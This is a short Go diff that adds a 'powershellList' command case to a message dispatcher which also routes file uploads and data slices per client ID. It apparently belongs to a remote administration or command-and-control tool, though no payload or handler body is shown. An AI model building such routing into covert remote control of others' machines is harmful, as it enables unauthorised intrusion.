@@ -72,6 +72,9 @@ func SettleMsg(msg, clientId string, data *string) {
 	case "fileUpload":
 		go fileUploadCmd(clientId, decData)
 		return
+	case "powershellList":
+		go powershellListCmd(clientId, decData)
+		return
 
 	case "sliceData":
 		m, exist := setchannel.GetFileSliceDataChan(clientId)
